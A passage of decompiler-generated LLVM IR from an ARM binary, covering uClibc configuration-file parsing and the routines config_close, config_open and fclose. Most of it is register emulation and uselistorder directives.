  store i1 %v9_15d5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15d5c, label %dec_label_pc_15d80thread-pre-split, label %dec_label_pc_15d6c

dec_label_pc_15d6c:                               ; preds = %dec_label_pc_15d54
  store i32 %v2_15d44, i32* %r0.global-to-local, align 4
  %v1_15d70 = inttoptr i32 %v2_15d44 to i16*
  %v2_15d70 = call i32 @getc_unlocked(i16* %v1_15d70)
  store i32 %v2_15d70, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15d80

dec_label_pc_15d78:                               ; preds = %dec_label_pc_15d44
  store i32 %v2_15d44, i32* %r0.global-to-local, align 4
  %v1_15d7c = call i32 @__GI_fgetc(i32 %v2_15d44)
  store i32 %v1_15d7c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15d80

dec_label_pc_15d80thread-pre-split:               ; preds = %dec_label_pc_15d54
  %v2_15d60 = inttoptr i32 %v3_15d54 to i8*
  %v3_15d60 = load i8, i8* %v2_15d60, align 1
  %v4_15d60 = zext i8 %v3_15d60 to i32
  store i32 %v4_15d60, i32* %r0.global-to-local, align 4
  %v6_15d60 = add i32 %v3_15d54, 1
  store i32 %v6_15d60, i32* %r2.global-to-local, align 4
  store i32 %v6_15d60, i32* %v2_15d54, align 4
  %v0_15d80.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15d80

dec_label_pc_15d80:                               ; preds = %dec_label_pc_15d80thread-pre-split, %dec_label_pc_15d6c, %dec_label_pc_15d78
  %v1_15d84 = phi i32 [ %v0_15d80.pr, %dec_label_pc_15d80thread-pre-split ], [ %v2_15d70, %dec_label_pc_15d6c ], [ %v1_15d7c, %dec_label_pc_15d78 ]
  %v7_15d80 = icmp eq i32 %v1_15d84, 10
  store i1 %v7_15d80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15d80, label %dec_label_pc_15d8c.loopexit, label %bb66

bb66:                                             ; preds = %dec_label_pc_15d80
  %v8_15d84 = icmp eq i32 %v1_15d84, -1
  store i1 %v8_15d84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_15d84, label %dec_label_pc_15d8c.loopexit, label %.dec_label_pc_15d44_crit_edge

.dec_label_pc_15d44_crit_edge:                    ; preds = %bb66
  %v0_15d44.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15d44

dec_label_pc_15d8c.loopexit:                      ; preds = %bb66, %dec_label_pc_15d80
  %v0_15d8c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15d8c

dec_label_pc_15d8c:                               ; preds = %dec_label_pc_15ce4, %dec_label_pc_15d8c.loopexit
  %v0_15d8c = phi i32 [ %v0_15d8c.pre, %dec_label_pc_15d8c.loopexit ], [ %v1_15cf8, %dec_label_pc_15ce4 ]
  %v7_15d8c = icmp eq i32 %v0_15d8c, -1
  store i1 %v7_15d8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15d8c, label %dec_label_pc_15ed4, label %dec_label_pc_15d94

dec_label_pc_15d94:                               ; preds = %dec_label_pc_15d8c
  store i32 %v1_15bfc, i32* %r3.global-to-local, align 4
  store i1 %v2_15d98, i1* %cpsr_z.global-to-local, align 1
  %v0_15d9c = load i32, i32* @r5, align 4
  %v1_15d9c = add i32 %v0_15d9c, 12
  %v2_15d9c = inttoptr i32 %v1_15d9c to i32*
  %v3_15d9c = load i32, i32* %v2_15d9c, align 4
  store i32 %v3_15d9c, i32* @r4, align 4
  br i1 %v2_15d98, label %dec_label_pc_15db4, label %dec_label_pc_15da4

dec_label_pc_15da4:                               ; preds = %dec_label_pc_15d94
  store i32 %v3_15d9c, i32* @r0, align 4
  %v0_15da8 = load i32, i32* @sl, align 4
  %v2_15dac = inttoptr i32 %v3_15d9c to i8*
  %v3_15dac = call i32 @__GI_strspn(i8* %v2_15dac, i32 %v0_15da8)
  store i32 %v3_15dac, i32* %r0.global-to-local, align 4
  %v0_15db0 = load i32, i32* @r4, align 4
  %v2_15db0 = add i32 %v0_15db0, %v3_15dac
  store i32 %v2_15db0, i32* @r4, align 4
  br label %dec_label_pc_15db4

dec_label_pc_15db4:                               ; preds = %dec_label_pc_15d94, %dec_label_pc_15da4
  %v0_15db4 = phi i32 [ %v3_15d9c, %dec_label_pc_15d94 ], [ %v2_15db0, %dec_label_pc_15da4 ]
  %v1_15db4 = inttoptr i32 %v0_15db4 to i8*
  %v2_15db4 = load i8, i8* %v1_15db4, align 1
  %v3_15db4 = zext i8 %v2_15db4 to i32
  store i32 %v3_15db4, i32* %r2.global-to-local, align 4
  %v2_15db8 = icmp eq i8 %v2_15db4, 0
  store i1 %v2_15db8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15db8, label %dec_label_pc_15c24.backedge, label %dec_label_pc_15dc0

dec_label_pc_15c24.backedge:                      ; preds = %dec_label_pc_15db4, %dec_label_pc_15dc0, %dec_label_pc_15ecc
  %v0_15c24.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15c24

dec_label_pc_15dc0:                               ; preds = %dec_label_pc_15db4
  %v0_15dc0 = load i32, i32* @r7, align 4
  %v1_15dc0 = inttoptr i32 %v0_15dc0 to i8*
  %v2_15dc0 = load i8, i8* %v1_15dc0, align 1
  %v3_15dc0 = zext i8 %v2_15dc0 to i32
  store i32 %v3_15dc0, i32* %r3.global-to-local, align 4
  %v9_15dc4 = icmp eq i8 %v2_15dc0, %v2_15db4
  store i1 %v9_15dc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15dc4, label %dec_label_pc_15c24.backedge, label %dec_label_pc_15dcc

dec_label_pc_15dcc:                               ; preds = %dec_label_pc_15dc0
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_15dd0 = load i32, i32* @r5, align 4
  %v1_15dd0 = add i32 %v0_15dd0, 4
  %v2_15dd0 = inttoptr i32 %v1_15dd0 to i32*
  %v3_15dd0 = load i32, i32* %v2_15dd0, align 4
  store i32 %v3_15dd0, i32* %r0.global-to-local, align 4
  %v0_15dd4 = load i32, i32* @fp, align 4
  store i32 %v3_15dd0, i32* %v1_15df0, align 4
  store i32 %v3_15be8, i32* %r2.global-to-local, align 4
  %v3_15de0 = inttoptr i32 %v3_15dd0 to i8*
  %v4_15de0 = call i32 @__GI_memset(i8* %v3_15de0, i32 %v0_15dd4, i32 %v3_15be8)
  store i32 %v4_15de0, i32* %r0.global-to-local, align 4
  %v0_15de4 = load i32, i32* @fp, align 4
  store i32 %v0_15de4, i32* @r6, align 4
  %v0_15ea412 = load i32, i32* @r4, align 4
  %v1_15ea413 = inttoptr i32 %v0_15ea412 to i8*
  %v2_15ea414 = load i8, i8* %v1_15ea413, align 1
  %v3_15ea415 = zext i8 %v2_15ea414 to i32
  store i32 %v3_15ea415, i32* %r2.global-to-local, align 4
  %v2_15ea816 = icmp eq i8 %v2_15ea414, 0
  store i1 %v2_15ea816, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15ea816, label %dec_label_pc_15ec0, label %dec_label_pc_15eb0

dec_label_pc_15dec:                               ; preds = %bb72
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_15df0 = load i32, i32* %v1_15df0, align 4
  store i32 %v2_15df0, i32* %r3.global-to-local, align 4
  store i32 %v1_15c00, i32* %r2.global-to-local, align 4
  %v9_15df8 = icmp eq i32 %v2_15dfc, %v1_15c00
  store i1 %v9_15df8, i1* %cpsr_z.global-to-local, align 1
  %v5_15dfc = mul i32 %v2_15dfc, 4
  %v6_15dfc = add i32 %v2_15df0, %v5_15dfc
  %v7_15dfc = inttoptr i32 %v6_15dfc to i32*
  store i32 %v0_15dfc, i32* %v7_15dfc, align 4
  br i1 %v9_15df8, label %dec_label_pc_15e04, label %dec_label_pc_15e10

dec_label_pc_15e04:                               ; preds = %dec_label_pc_15dec
  store i32 %v1_15c0c, i32* %r3.global-to-local, align 4
  store i1 %v2_15e08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15e08, label %dec_label_pc_15e10, label %dec_label_pc_15e30

dec_label_pc_15e10:                               ; preds = %dec_label_pc_15e04, %dec_label_pc_15dec
  %v0_15e10 = load i32, i32* @r7, align 4
  %v1_15e10 = inttoptr i32 %v0_15e10 to i8*
  %v2_15e10 = load i8, i8* %v1_15e10, align 1
  %v3_15e10 = zext i8 %v2_15e10 to i32
  store i32 %v3_15e10, i32* %r3.global-to-local, align 4
  %v2_15e14 = icmp eq i8 %v2_15e10, 0
  store i1 %v2_15e14, i1* %cpsr_z.global-to-local, align 1
  %v0_15e18 = load i32, i32* @r4, align 4
  store i32 %v0_15e18, i32* @r0, align 4
  %v1_15e1c = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_15e14, i32 %v1_15e1c, i32 %v0_15e10
  store i32 %storemerge, i32* @r1, align 4
  %v0_15e24 = call i32 @strcspn()
  store i32 %v0_15e24, i32* %r0.global-to-local, align 4
  %v0_15e28 = load i32, i32* @r4, align 4
  %v2_15e28 = add i32 %v0_15e28, %v0_15e24
  store i32 %v2_15e28, i32* @r4, align 4
  br label %dec_label_pc_15e68

dec_label_pc_15e30:                               ; preds = %dec_label_pc_15e04
  %v0_15e30 = load i32, i32* @r4, align 4
  store i32 %v0_15e30, i32* @r0, align 4
  %v0_15e34 = load i32, i32* @r7, align 4
  %v1_15e34 = inttoptr i32 %v0_15e34 to i8*
  %v2_15e34 = load i8, i8* %v1_15e34, align 1
  %v3_15e34 = zext i8 %v2_15e34 to i32
  %v5_15e38 = call i32 @__GI_strchrnul(i32 %v0_15e30, i32 %v3_15e34, i32 %v1_15c00, i32 %v1_15c0c)
  store i32 %v5_15e38, i32* %r0.global-to-local, align 4
  store i32 %v1_15bfc, i32* %r2.global-to-local, align 4
  store i1 %v2_15d98, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_15e38, i32* @r4, align 4
  br i1 %v2_15d98, label %dec_label_pc_15e68, label %dec_label_pc_15e54

dec_label_pc_15e50:                               ; preds = %dec_label_pc_15e54
  %v1_15e50 = add i32 %v0_15e68.pre, -1
  store i32 %v1_15e50, i32* @r4, align 4
  br label %dec_label_pc_15e54

dec_label_pc_15e54:                               ; preds = %dec_label_pc_15e30, %dec_label_pc_15e50
  %v0_15e54 = phi i32 [ %v1_15e50, %dec_label_pc_15e50 ], [ %v5_15e38, %dec_label_pc_15e30 ]
  %v1_15e54 = add i32 %v0_15e54, -1
  %v2_15e54 = inttoptr i32 %v1_15e54 to i8*
  %v3_15e54 = load i8, i8* %v2_15e54, align 1
  %v4_15e54 = zext i8 %v3_15e54 to i32
  %v0_15e58 = load i32, i32* @sl, align 4
  store i32 %v0_15e58, i32* @r0, align 4
  %v2_15e5c = call i32 @__GI_strchr(i32 %v0_15e58, i32 %v4_15e54)
  store i32 %v2_15e5c, i32* %r0.global-to-local, align 4
  %v2_15e60 = icmp eq i32 %v2_15e5c, 0
  store i1 %v2_15e60, i1* %cpsr_z.global-to-local, align 1
  %v0_15e68.pre = load i32, i32* @r4, align 4
  br i1 %v2_15e60, label %dec_label_pc_15e68, label %dec_label_pc_15e50

dec_label_pc_15e68:                               ; preds = %dec_label_pc_15e54, %dec_label_pc_15e30, %dec_label_pc_15e10
  %v3_15e74 = phi i32 [ %v5_15e38, %dec_label_pc_15e30 ], [ %v2_15e28, %dec_label_pc_15e10 ], [ %v0_15e68.pre, %dec_label_pc_15e54 ]
  %v1_15e68 = inttoptr i32 %v3_15e74 to i8*
  %v2_15e68 = load i8, i8* %v1_15e68, align 1
  %v3_15e68 = zext i8 %v2_15e68 to i32
  store i32 %v3_15e68, i32* %r2.global-to-local, align 4
  %v0_15e6c = load i32, i32* @r7, align 4
  %v1_15e6c = inttoptr i32 %v0_15e6c to i8*
  %v2_15e6c = load i8, i8* %v1_15e6c, align 1
  %v3_15e6c = zext i8 %v2_15e6c to i32
  store i32 %v3_15e6c, i32* %r3.global-to-local, align 4
  %v9_15e70 = icmp eq i8 %v2_15e6c, %v2_15e68
  store i1 %v9_15e70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15e70, label %bb69, label %dec_label_pc_15e7c

bb69:                                             ; preds = %dec_label_pc_15e68
  %v1_15e74 = load i32, i32* @fp, align 4
  %v2_15e74 = trunc i32 %v1_15e74 to i8
  store i8 %v2_15e74, i8* %v1_15e68, align 1
  %v0_15e78.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15e78.pr, label %bb71, label %.dec_label_pc_15e7c_crit_edge

.dec_label_pc_15e7c_crit_edge:                    ; preds = %bb69
  %v0_15e7c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15e7c

dec_label_pc_15e7c:                               ; preds = %.dec_label_pc_15e7c_crit_edge, %dec_label_pc_15e68
  %v0_15e7c = phi i32 [ %v0_15e7c.pre, %.dec_label_pc_15e7c_crit_edge ], [ %v3_15e68, %dec_label_pc_15e68 ]
  %v2_15e7c = icmp eq i32 %v0_15e7c, 0
  store i1 %v2_15e7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15e7c, label %bb71, label %bb70

bb70:                                             ; preds = %dec_label_pc_15e7c
  %v1_15e80 = load i32, i32* @fp, align 4
  %v2_15e80 = trunc i32 %v1_15e80 to i8
  %v3_15e80 = load i32, i32* @r4, align 4
  %v4_15e80 = inttoptr i32 %v3_15e80 to i8*
  store i8 %v2_15e80, i8* %v4_15e80, align 1
  %v5_15e80 = load i32, i32* @r4, align 4
  %v6_15e80 = add i32 %v5_15e80, 1
  store i32 %v6_15e80, i32* @r4, align 4
  br label %bb71

bb71:                                             ; preds = %bb69, %dec_label_pc_15e7c, %bb70
  %v2_15e84 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_15e84, i32* %r3.global-to-local, align 4
  %v2_15e88 = icmp eq i32 %v2_15e84, 0
  store i1 %v2_15e88, i1* %cpsr_z.global-to-local, align 1
  %v0_15ea4.pre = load i32, i32* @r4, align 4
  br i1 %v2_15e88, label %dec_label_pc_15ea0, label %dec_label_pc_15e90

dec_label_pc_15e90:                               ; preds = %bb71
  store i32 %v0_15ea4.pre, i32* @r0, align 4
  %v0_15e94 = load i32, i32* @sl, align 4
  %v2_15e98 = inttoptr i32 %v0_15ea4.pre to i8*
  %v3_15e98 = call i32 @__GI_strspn(i8* %v2_15e98, i32 %v0_15e94)
  store i32 %v3_15e98, i32* %r0.global-to-local, align 4
  %v0_15e9c = load i32, i32* @r4, align 4
  %v2_15e9c = add i32 %v0_15e9c, %v3_15e98
  store i32 %v2_15e9c, i32* @r4, align 4
  br label %dec_label_pc_15ea0

dec_label_pc_15ea0:                               ; preds = %bb71, %dec_label_pc_15e90
  %v0_15ea4 = phi i32 [ %v2_15e9c, %dec_label_pc_15e90 ], [ %v0_15ea4.pre, %bb71 ]
  %v0_15ea0 = load i32, i32* @r6, align 4
  %v1_15ea0 = add i32 %v0_15ea0, 1
  store i32 %v1_15ea0, i32* @r6, align 4
  %v1_15ea4 = inttoptr i32 %v0_15ea4 to i8*
  %v2_15ea4 = load i8, i8* %v1_15ea4, align 1
  %v3_15ea4 = zext i8 %v2_15ea4 to i32
  store i32 %v3_15ea4, i32* %r2.global-to-local, align 4
  %v2_15ea8 = icmp eq i8 %v2_15ea4, 0
  store i1 %v2_15ea8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15ea8, label %dec_label_pc_15ec0, label %dec_label_pc_15eb0

dec_label_pc_15eb0:                               ; preds = %dec_label_pc_15dcc, %dec_label_pc_15ea0
  %v0_15dfc = phi i32 [ %v0_15ea4, %dec_label_pc_15ea0 ], [ %v0_15ea412, %dec_label_pc_15dcc ]
  %v2_15dfc = phi i32 [ %v1_15ea0, %dec_label_pc_15ea0 ], [ %v0_15de4, %dec_label_pc_15dcc ]
  %v1_15eb4 = phi i32 [ %v3_15ea4, %dec_label_pc_15ea0 ], [ %v3_15ea415, %dec_label_pc_15dcc ]
  %v0_15eb0 = load i32, i32* @r7, align 4
  %v1_15eb0 = inttoptr i32 %v0_15eb0 to i8*
  %v2_15eb0 = load i8, i8* %v1_15eb0, align 1
  %v3_15eb0 = zext i8 %v2_15eb0 to i32
  store i32 %v3_15eb0, i32* %r3.global-to-local, align 4
  %v9_15eb4 = icmp eq i32 %v3_15eb0, %v1_15eb4
  store i1 %v9_15eb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15eb4, label %dec_label_pc_15ec0, label %bb72

bb72:                                             ; preds = %dec_label_pc_15eb0
  %v2_15eb8 = load i32, i32* @sb, align 4
  %v3_15eb8 = sub i32 %v2_15dfc, %v2_15eb8
  %v5_15eb8 = xor i32 %v2_15eb8, %v2_15dfc
  %v6_15eb8 = xor i32 %v3_15eb8, %v2_15dfc
  %v7_15eb8 = and i32 %v6_15eb8, %v5_15eb8
  %v8_15eb8 = icmp slt i32 %v7_15eb8, 0
  %v9_15eb8 = icmp slt i32 %v3_15eb8, 0
  %v10_15eb8 = icmp eq i32 %v2_15dfc, %v2_15eb8
  store i1 %v10_15eb8, i1* %cpsr_z.global-to-local, align 1
  %v2_15ebc = xor i1 %v9_15eb8, %v8_15eb8
  br i1 %v2_15ebc, label %dec_label_pc_15dec, label %dec_label_pc_15ec0

dec_label_pc_15ec0:                               ; preds = %dec_label_pc_15eb0, %dec_label_pc_15ea0, %bb72, %dec_label_pc_15dcc
  %v0_15ec4 = phi i32 [ %v0_15de4, %dec_label_pc_15dcc ], [ %v2_15dfc, %dec_label_pc_15eb0 ], [ %v1_15ea0, %dec_label_pc_15ea0 ], [ %v2_15dfc, %bb72 ]
  store i32 %v3_15be4, i32* %r2.global-to-local, align 4
  %v9_15ec4 = icmp eq i32 %v0_15ec4, %v3_15be4
  store i1 %v9_15ec4, i1* %cpsr_z.global-to-local, align 1
  %v6_15ec8 = icmp slt i32 %v0_15ec4, %v3_15be4
  br i1 %v6_15ec8, label %dec_label_pc_15ecc, label %dec_label_pc_15ed8

dec_label_pc_15ecc:                               ; preds = %dec_label_pc_15ec0
  %v0_15ecc = load i32, i32* @r8, align 4
  %v1_15ecc = and i32 %v0_15ecc, 1048576
  %v2_15ecc = icmp eq i32 %v1_15ecc, 0
  store i1 %v2_15ecc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15ecc, label %dec_label_pc_15c24.backedge, label %dec_label_pc_15ed4

dec_label_pc_15ed4:                               ; preds = %dec_label_pc_15ecc, %dec_label_pc_15d8c, %.thread, %entry
  br label %dec_label_pc_15ed8

dec_label_pc_15ed8:                               ; preds = %dec_label_pc_15ec0, %dec_label_pc_15ca8, %dec_label_pc_15ed4
  %v0_15ed8 = phi i32 [ %v0_15cb8, %dec_label_pc_15ca8 ], [ 0, %dec_label_pc_15ed4 ], [ %v0_15ec4, %dec_label_pc_15ec0 ]
  store i32 %v0_15ed8, i32* %r0.global-to-local, align 4
  store i32 %v3_15bc0, i32* @r4, align 4
  store i32 %v6_15bc0, i32* @r5, align 4
  store i32 %v9_15bc0, i32* @r6, align 4
  store i32 %v12_15bc0, i32* @r7, align 4
  store i32 %v15_15bc0, i32* @r8, align 4
  store i32 %v18_15bc0, i32* @sb, align 4
  store i32 %v21_15bc0, i32* @sl, align 4
  store i32 %v24_15bc0, i32* @fp, align 4
  ret i32 %v0_15ed8

; uselistorder directives
  uselistorder i32 %v0_15ed8, { 1, 0 }
  uselistorder i32 %v0_15ec4, { 0, 2, 1 }
  uselistorder i32 %v3_15eb8, { 1, 0 }
  uselistorder i32 %v2_15eb8, { 1, 0, 2 }
  uselistorder i32 %v2_15dfc, { 0, 1, 7, 2, 3, 6, 5, 4 }
  uselistorder i32 %v0_15ea4.pre, { 0, 2, 1 }
  uselistorder i32 %v5_15e38, { 1, 0, 2, 3 }
  uselistorder i32 %v0_15de4, { 1, 0, 2 }
  uselistorder i1 %v9_15dc4, { 1, 0 }
  uselistorder i32 %v3_15d9c, { 0, 2, 1, 3 }
  uselistorder i1 %v7_15d8c, { 1, 0 }
  uselistorder i1 %v8_15d84, { 1, 0 }
  uselistorder i32 %v3_15d54, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_15d44, { 3, 2, 0, 1, 4, 5, 6, 7 }
  uselistorder i32 %v5_15d2c, { 1, 0, 2 }
  uselistorder i32 %v1_15d1c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_15d08, { 0, 2, 1, 3 }
  uselistorder i32 %v1_15d00, { 1, 0 }
  uselistorder i32 %v1_15cec, { 1, 0 }
  uselistorder i32 %v1_15ce8, { 1, 0 }
  uselistorder i32 %v2_15cc4, { 1, 0 }
  uselistorder i32 %v1_15ca8, { 2, 0, 1 }
  uselistorder i32 %v0_15c90, { 1, 0 }
  uselistorder i32 %v1_15c80, { 0, 2, 1 }
  uselistorder i32* %v1_15df0, { 1, 0 }
  uselistorder i1 %v2_15d98, { 1, 0, 2, 3 }
  uselistorder i32 %v1_15c0c, { 2, 0, 1, 3 }
  uselistorder i32 %v1_15c00, { 2, 1, 0 }
  uselistorder i32 %v3_15be8, { 1, 2, 0 }
  uselistorder i32 %v3_15be4, { 2, 1, 0 }
  uselistorder i32 %v1_15bdc, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 8, 3, 4, 5, 6, 7, 1, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 27, 26, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 12, 13, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i32 (i32*, i32, i32, i32)* @realloc, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 (i8*)* @strlen, { 1, 0 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_15ed8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15ec0, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_15eb0, { 1, 0 }
  uselistorder label %dec_label_pc_15ea0, { 1, 0 }
  uselistorder label %bb71, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15e54, { 1, 0 }
  uselistorder label %dec_label_pc_15c24.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15db4, { 1, 0 }
  uselistorder label %dec_label_pc_15d8c, { 1, 0 }
  uselistorder label %dec_label_pc_15d80, { 0, 2, 1 }
  uselistorder label %dec_label_pc_15d44, { 1, 0 }
  uselistorder label %dec_label_pc_15c78, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_15eec = icmp eq i32* %arg1, null
  br i1 %v2_15eec, label %dec_label_pc_15f14, label %dec_label_pc_15ef4

dec_label_pc_15ef4:                               ; preds = %entry
  %v2_15ef4 = load i32, i32* %arg1, align 4
  %v1_15ef8 = inttoptr i32 %v2_15ef4 to i16*
  %v2_15ef8 = call i32 @__GI_fclose(i16* %v1_15ef8)
  %v0_15efc = load i32, i32* @r4, align 4
  %v1_15efc = add i32 %v0_15efc, 20
  %v2_15efc = inttoptr i32 %v1_15efc to i32*
  %v3_15efc = load i32, i32* %v2_15efc, align 4
  %v2_15f00 = icmp eq i32 %v3_15efc, 0
  br i1 %v2_15f00, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_15ef4
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_15ef4, %bb
  store i32 89868, i32* @lr, align 4
  %v1_15f08 = xor i1 %v2_15f00, true
  call void @__pseudo_cond_branch(i1 %v1_15f08, i32 ptrtoint (i32* @global_var_135dc.33 to i32))
  %v0_15f0c = load i32, i32* @r4, align 4
  store i32 %v0_15f0c, i32* @r0, align 4
  %v0_15f10 = call i32 @free()
  br label %dec_label_pc_15f14

dec_label_pc_15f14:                               ; preds = %entry, %bb6
  %v1_15f18 = phi i32 [ 0, %entry ], [ %v0_15f10, %bb6 ]
  ret i32 %v1_15f18

; uselistorder directives
  uselistorder label %dec_label_pc_15f14, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15f28 = load i32, i32* @r4, align 4
  store i32 %v3_15f28, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 -33972), i32* @r1, align 4
  %v0_15f30 = call i32 @__GI_fopen()
  store i32 %v0_15f30, i32* %r0.global-to-local, align 4
  store i32 %v0_15f30, i32* @r4, align 4
  %v2_15f34 = icmp eq i32 %v0_15f30, 0
  br i1 %v2_15f34, label %bb, label %dec_label_pc_15f40

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_15f40:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_15f48 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_15f48, i32* %r0.global-to-local, align 4
  %v2_15f4c = icmp eq i32 %v2_15f48, 0
  br i1 %v2_15f4c, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_15f40
  %v1_15f50 = load i32, i32* @r4, align 4
  %v3_15f50 = inttoptr i32 %v2_15f48 to i32*
  store i32 %v1_15f50, i32* %v3_15f50, align 4
  %v1_15f58.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_15f40, %bb4
  %v1_15f58 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_15f40 ], [ %v1_15f58.pre, %bb4 ]
  %v2_15f54 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15f54, i32* @r4, align 4
  ret i32 %v1_15f58

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 (i32, i32)* @calloc, { 41, 38, 39, 40, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 1, 0, 26, 25, 24, 23, 3, 2, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_15f64 = load i32, i32* @r4, align 4
  store i32 %v3_15f64, i32* %stack_var_-36, align 4
  %v6_15f64 = load i32, i32* @r5, align 4
  %v9_15f64 = load i32, i32* @r6, align 4
  %v12_15f64 = load i32, i32* @r7, align 4
  %v2_15f68 = add i32 %tmp, 52
  %v3_15f68 = inttoptr i32 %v2_15f68 to i32*
  %v4_15f68 = load i32, i32* %v3_15f68, align 4
  store i32 %v4_15f68, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15f70 = icmp eq i32 %v4_15f68, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* @r8, align 4
  br i1 %v2_15f70, label %dec_label_pc_15f84, label %dec_label_pc_15fe8

dec_label_pc_15f84:                               ; preds = %entry
  %v0_15f84 = call i32 @__aeabi_read_tp()
  store i32 %v0_15f84, i32* %r0.global-to-local, align 4
  %v0_15f88 = load i32, i32* @r5, align 4
  %v1_15f88 = add i32 %v0_15f88, 64
  %v2_15f88 = inttoptr i32 %v1_15f88 to i32*
  %v3_15f88 = load i32, i32* %v2_15f88, align 4
  store i32 %v3_15f88, i32* %r3.global-to-local, align 4
  %v1_15f8c = add i32 %v0_15f84, -1168
  store i32 %v1_15f8c, i32* @r6, align 4
  %v3_15f90 = icmp uge i32 %v3_15f88, %v1_15f8c
  store i1 %v3_15f90, i1* %cpsr_c.global-to-local, align 1
  %v9_15f90 = icmp eq i32 %v3_15f88, %v1_15f8c
  br i1 %v9_15f90, label %dec_label_pc_15fdc, label %dec_label_pc_15f98

dec_label_pc_15f98:                               ; preds = %dec_label_pc_15f84
  %v1_15f98 = add i32 %v0_15f88, 56
  store i32 %v1_15f98, i32* @r7, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v1_15f98, i32* %r2.global-to-local, align 4
  %v0_15fa4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_15fa4, i32* @r4, align 4
  %v1_15fa8115 = inttoptr i32 %v1_15f98 to i32*
  %v2_15fa8116 = load i32, i32* %v1_15fa8115, align 4
  store i32 %v2_15fa8116, i32* %r3.global-to-local, align 4
  %v3_15fac118 = icmp uge i32 %v2_15fa8116, %v0_15fa4
